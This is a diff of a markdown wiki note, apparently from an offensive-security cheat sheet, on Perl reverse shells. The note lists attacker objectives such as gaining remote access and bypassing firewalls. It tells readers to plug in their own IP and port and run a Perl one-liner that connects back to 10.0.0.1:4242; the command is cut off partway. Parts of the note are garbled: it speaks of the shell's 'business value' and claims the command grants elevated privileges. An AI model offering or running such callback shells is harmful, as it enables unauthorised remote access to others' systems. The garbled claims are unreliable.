@@ -34,6 +34,8 @@ From a technical perspective, a Perl reverse shell works by creating a socket co
 
 The business value of a Perl reverse shell is that it allows attackers to gain remote access to a system, which can be used for various purposes such as stealing sensitive data, installing malware, or launching further attacks.
 
+ 
+
 ## Requirements
 
 1. Network access to the target system
@@ -41,6 +43,8 @@ The business value of a Perl reverse shell is that it allows attackers to gain r
 1. Perl installed on the target system
 
 1. A listening server on the attacker's machine
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ The business value of a Perl reverse shell is that it allows attackers to gain r
 
 1. Regularly update and patch software to prevent known vulnerabilities from being exploited
 
+ 
+
 ## Objectives
 
 1. Gain remote access to a target system
@@ -58,11 +64,19 @@ The business value of a Perl reverse shell is that it allows attackers to gain r
 
 1. Bypass firewalls and other security measures
 
+ 
+
 # Instructions
 
 1. To use this command, replace the IP address and port number with your own values. Then, run the command in a terminal to establish a reverse shell connection to the target machine.
 
+ 
+
+
+
 **Code**: [[perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S]]
+
+
 
 > - The first command creates a socket connection to the specified IP address and port number.
 - If the connection is successful, it opens standard input, output, and error streams and executes a shell command with elevated privileges.
@@ -87,3 +101,5 @@ The business value of a Perl reverse shell is that it allows attackers to gain r
 - [[Perl]]
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
